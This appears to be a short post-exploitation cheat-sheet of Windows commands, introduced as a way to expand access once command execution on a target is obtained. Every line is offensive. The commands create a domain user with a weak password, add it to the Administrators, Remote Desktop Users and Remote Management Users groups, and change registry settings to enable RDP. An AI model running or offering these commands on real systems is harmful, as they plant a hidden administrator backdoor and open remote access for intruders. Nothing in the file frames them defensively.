# these commands can be used to safely expand access into the target environment once command execution has been obtained

net user /add added_user Password1# /domain
net localgroup administrators added_user /add
net localgroup "Remote Desktop Users" added_user /add
net localgroup "Remote Management Users" added_user /add

# enabling RDP remotely:
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0

Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 1
